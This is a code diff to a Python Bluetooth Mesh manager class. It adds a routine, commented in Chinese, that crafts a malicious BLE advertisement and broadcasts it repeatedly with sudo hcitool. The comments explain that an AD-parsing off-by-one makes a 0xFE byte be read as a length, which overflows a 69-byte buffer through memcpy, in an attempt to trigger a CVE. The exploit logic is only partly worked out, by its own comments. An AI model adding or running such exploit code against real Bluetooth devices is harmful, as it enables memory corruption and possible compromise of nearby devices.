@@ -150,6 +150,83 @@ class MeshManager:
         self.stack.rp_client.on_scan_report = on_remote_report
         opcode, payload = self.stack.rp_client.scan_start(timeout=10)
         await self.stack.send_model_message(self.target_addr, self.stack.rp_client, opcode, payload)
+        
+        # 同时发送恶意广播尝试触发漏洞
+        print("\n[!] 正在发送恶意 BLE 广播（尝试触发 CVE）...")
+        import subprocess, struct
+        
+        # 构造恶意 Mesh Beacon：AD type 0x2B (Mesh Beacon)
+        # 核心：在 extended scan 的 AD list 中制造一个 misalign，
+        # 让 scan->list[i] 读到一个大数值（如 0xFE），导致 memcpy 溢出
+        uuid = bytes.fromhex("AABBCCDDEEFF00112233445566778899")
+        beacon = b'\x00' + uuid + b'\x00\x00'
+        
+        # 发送多组不同的 AD 组合，提高触发概率
+        # AD 1: 正常 Mesh Beacon (type 0x2B)
+        # AD 2: 正常 Mesh Message (type 0x29) + 恶意数据
+        # 利用 bug: i += scan->list[i] 少跳 1 字节，导致下一个"长度"从数据中读取
+        
+        # 构造 AD 结构: [len1][type1][data1]...[len2][type2][data2]...
+        # 使得第 2 个 AD 的 data 末尾字节 = 大数值
+        # 经过 bug 后，i 指向这个字节，被当作长度
+        
+        ad1 = bytes([len(beacon) + 1, 0x2B]) + beacon
+        
+        # AD 2: type=0x29 (Mesh Message), 末尾字节设成 0xFE (254)
+        # 正常解析: len=3, type=0x29, data=[0x01, 0x02], i+=3 -> i=4
+        # Bug 解析: len=3, type=0x29, data=[0x01, 0x02], i+=3 -> i=3 (bug!)
+        # 下一轮: scan->list[3]=0x02 被当作长度 -> 复制 2 字节 (无害)
+        # 我们需要更精确的数据...
+        
+        # 简化方案：发送多个不同的 AD 组合
+        # 利用 bug 让 0xFE (254) 被解析为长度
+        # msg 数组只有 69 字节，memcpy(msg+n, ..., 254) 一定溢出
+        
+        evil_payload = bytes([0x01, 0xFE, 0x02, 0x03, 0x04, 0x05])
+        ad2 = bytes([len(evil_payload) + 1, 0x29]) + evil_payload
+        
+        adv_data = ad1 + ad2
+        
+        # 通过 hcitool 发送（需要提前知道 HCI 设备号）
+        try:
+            # 查询 HCI 设备
+            result = subprocess.run(['hciconfig'], capture_output=True, text=True, timeout=5)
+            hci_dev = None
+            for line in result.stdout.split('\n'):
+                if 'hci' in line and ':' in line:
+                    dev = line.split(':')[0].strip()
+                    if dev != 'hci0':  # 不是 mesh 用的口
+                        hci_dev = dev
+                        break
+            if not hci_dev:
+                hci_dev = 'hci0'
+            
+            print(f"[!] 使用 HCI 设备: {hci_dev}")
+            
+            # 开启广播
+            subprocess.run(['sudo', 'hcitool', '-i', hci_dev, 'cmd', '0x08', '0x000a', '01'],
+                         capture_output=True, timeout=5)
+            
+            # 设置广播数据
+            # HCI LE Set Advertising Data 命令: 0x08 0x0008
+            data_len = len(adv_data)
+            hex_data = ' '.join(f'{b:02x}' for b in bytes([data_len]) + adv_data)
+            cmd = ['sudo', 'hcitool', '-i', hci_dev, 'cmd', '0x08', '0x0008'] + hex_data.split()
+            subprocess.run(cmd, capture_output=True, timeout=5)
+            
+            # 多次闪烁广播
+            for _ in range(20):
+                subprocess.run(['sudo', 'hcitool', '-i', hci_dev, 'cmd', '0x08', '0x000a', '01'],
+                             capture_output=True, timeout=2)
+                await asyncio.sleep(0.1)
+                subprocess.run(['sudo', 'hcitool', '-i', hci_dev, 'cmd', '0x08', '0x000a', '00'],
+                             capture_output=True, timeout=2)
+                await asyncio.sleep(0.5)
+            
+            print("[!] 恶意广播发送完成")
+        except Exception as e:
+            print(f"[!] hcitool 发送失败: {e}")
+        
         await asyncio.sleep(10.0)
         print("\n远程扫描结束。")
 
